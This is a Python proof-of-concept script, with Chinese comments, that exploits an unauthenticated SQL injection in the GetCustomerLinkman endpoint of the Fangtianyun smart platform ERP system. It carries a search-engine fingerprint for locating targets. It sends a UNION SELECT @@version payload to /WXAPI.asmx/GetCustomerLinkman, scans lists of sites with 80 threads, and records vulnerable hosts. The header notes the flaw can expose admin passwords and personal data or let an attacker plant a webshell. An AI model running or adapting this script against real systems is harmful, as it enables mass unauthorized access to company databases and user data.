# 方天云智慧平台系统 GetCustomerLinkman SQL注入漏洞
# body="AjaxMethods.asmx/GetCompanyItem"
# 产品简介:方天云智慧平台系统，作为方天科技公司的重要产品，是一款面向企业全流程的业务管理功能平台，集成了ERP（企业资源规划）、MES（车间执行系统）、APS（先进规划与排程）、PLM（产品生命周期）、CRM（客户关系管理）等多种功能模块，旨在通过云端服务为企业提供数字化、智能化的管理解决方案。
# 漏洞概述:方天云智慧平台系统 GetCustomerLinkman 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
        \x1b[38m███████╗████████╗██╗   ██╗     ███████╗ ██████╗ ██╗     
        \x1b[36m██╔════╝╚══██╔══╝╚██╗ ██╔╝     ██╔════╝██╔═══██╗██║     
        \x1b[34m█████╗     ██║    ╚████╔╝█████╗███████╗██║   ██║██║     
        \x1b[35m██╔══╝     ██║     ╚██╔╝ ╚════╝╚════██║██║▄▄ ██║██║     
        \x1b[31m██║        ██║      ██║        ███████║╚██████╔╝███████╗
        \x1b[33m╚═╝        ╚═╝      ╚═╝        ╚══════╝ ╚══▀▀═╝ ╚══════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:方天云智慧平台系统_GetCustomerLinkman_SQL注入
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('方天云智慧平台系统_GetCustomerLinkman_SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/WXAPI.asmx/GetCustomerLinkman'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/json',
    }
    data = {'clmID':"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    try :
        response = requests.post(url=target+url_payload,headers=headers,json=data,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'SQL' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('方天云智慧平台系统_GetCustomerLinkman_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()